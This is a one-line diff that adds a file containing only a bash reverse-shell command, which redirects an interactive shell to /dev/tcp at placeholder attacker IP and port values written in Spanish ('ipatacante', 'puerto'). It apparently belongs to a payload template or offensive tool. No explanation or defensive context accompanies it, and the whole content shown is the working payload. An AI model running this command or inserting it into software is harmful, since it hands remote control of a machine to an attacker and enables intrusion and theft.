@@ -1,0 +1,1 @@
+bash -i>& /dev/tcp/{ipatacante}/{puerto} 0>&1
